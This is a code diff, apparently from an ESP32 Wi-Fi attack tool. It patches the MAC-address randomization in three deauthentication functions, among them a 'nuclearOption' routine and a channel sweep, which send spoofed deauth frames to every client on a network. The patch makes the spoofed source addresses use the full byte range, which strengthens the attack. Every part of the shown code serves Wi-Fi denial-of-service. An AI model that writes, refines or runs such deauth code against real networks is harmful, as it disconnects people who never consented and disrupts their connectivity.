@@ -110,7 +110,7 @@ DeauthResult nuclearOption(uint32_t durationMs) {
         uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
         uint8_t randomMac[6];
         for (int i = 0; i < 6; i++) {
-            randomMac[i] = (esp_random() % 255);
+            randomMac[i] = esp_random() & 0xFF;
         }
 
         // Deauth from multiple spoofed APs
@@ -181,7 +181,7 @@ DeauthResult broadcastDeauth(const DeauthConfig &config) {
         uint8_t spoofedMac[6];
         if (config.randomizeMac) {
             for (int i = 0; i < 6; i++) {
-                spoofedMac[i] = (esp_random() % 255);
+                spoofedMac[i] = esp_random() & 0xFF;
             }
         } else {
             memcpy(spoofedMac, config.targetBssid, 6);
@@ -251,7 +251,7 @@ DeauthResult channelSweep(const DeauthConfig &config) {
         uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
         uint8_t randomMac[6];
         for (int i = 0; i < 6; i++) {
-            randomMac[i] = (esp_random() % 255);
+            randomMac[i] = esp_random() & 0xFF;
         }
 
         sendDeauthPacket(broadcast, randomMac, broadcast);
